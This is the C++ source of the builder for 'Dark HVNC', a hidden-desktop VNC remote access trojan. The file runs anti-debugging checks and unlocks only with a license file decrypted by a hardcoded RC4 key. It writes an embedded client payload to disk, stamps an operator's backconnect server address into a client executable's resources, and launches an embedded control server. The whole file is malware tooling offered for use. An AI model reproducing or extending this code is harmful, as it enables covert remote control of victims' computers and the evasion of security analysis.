// dark_hiddenDesktopBuilder.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
//
#include <Windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <string>

#include "base64.h"
#include "antidbg.h"
#include "Runpe.h"
#include "rc4.h"
#include "rawControllServer.h"
#include "rawClient.h"
#include "json.hpp"


long WINAPI unhandled_exception_handler(EXCEPTION_POINTERS* p_exceptions)
{
	(void*)p_exceptions;
	return EXCEPTION_EXECUTE_HANDLER;
}

void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

std::string readFile()
{
	std::stringstream str;
	std::ifstream stream("darkrat.lic");
	if (stream.is_open())
	{
		while (stream.peek() != EOF)
		{
			str << (char)stream.get();
		}
		stream.close();
		return str.str();
	}
	else {
		return "false";
	}
}

int main()
{

	SetUnhandledExceptionFilter(unhandled_exception_handler);
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
	adbg_IsDebuggerPresent();
	adbg_IsDebuggerPresent();
	adbg_CheckRemoteDebuggerPresent();
	adbg_BeingDebuggedPEB();
	adbg_NtGlobalFlagPEB();
	adbg_HardwareDebugRegisters();
	adbg_RDTSC();
	adbg_QueryPerformanceCounter();
	adbg_GetTickCount();

	std::string user;
	std::string license = readFile();
	if (license == "false") {
		return 0;
	}

	std::cout << "Username:"; std::cin >> user;

	darkvnc::crypto::RC4 rc4;
	std::string enckey = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
	std::string toDecrypt;
	toDecrypt = rc4.doRC4(base64_decode(license.c_str()), (char*)enckey.c_str());
	char* c_wwrite = &toDecrypt[0u];
	//system("cls");
	json::JSON j_config = json::Object();
	j_config = json::JSON::Load(toDecrypt);
	if (j_config["username"].ToString() != user) {
		return 0;
	}
	system("cls");
	std::cout << "Welcome Back '" + user + "'  \n\n";


std::cout << R"(
  ____             _      _   ___     ___   _  ____ 
 |  _ \  __ _ _ __| | __ | | | \ \   / / \ | |/ ___|
 | | | |/ _` | '__| |/ / | |_| |\ \ / /|  \| | |    
 | |_| | (_| | |  |   <  |  _  | \ V / | |\  | |___ 
 |____/ \__,_|_|  |_|\_\ |_| |_|  \_/  |_| \_|\____|
 Created by DarkSpider		
 Jabber: darkspider@exploit.im        

 HVNC is booting up..                                          
)";

	Sleep(2000);
	system("cls");
	std::cout << "What did you want to do:\n";
	std::cout << "[1] Build New Client\n"
		<< "[2] Start Controll Server\n";

	std::string input;
	std::getline(std::cin, input);

	while (true) {
		system("cls");
		std::cout << "What did you want to do:\n";
		std::cout << "[1] Build New Client\n"
			<< "[2] Start Controll Server\n";
		std::getline(std::cin, input);

		if (input == "1") {

			system("cls");

			std::cout << "Writing Base Bin..\n";
			remove("hvnc.exe");
			DWORD Res;
			HANDLE hFile = CreateFile(L"hvnc.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE == hFile) {
				return false;
			}
			WriteFile(hFile, rawClient, sizeof(rawClient), &Res, NULL);
			CloseHandle(hFile);
			Sleep(1000);


			std::string write;
			std::cout << "Enter your Backconnect Server: (127.0.0.1)\n";
			std::cin >> write;

			std::cout << write << std::endl;
			char* c_write = &write[0u];
			std::cout << write << std::endl;
			WriteToResources("Client.exe", 10, (BYTE*)c_write, strlen(c_write));
		}
		else if (input == "2") {
			runBackServer(rawControllServer);
		}
	}



}

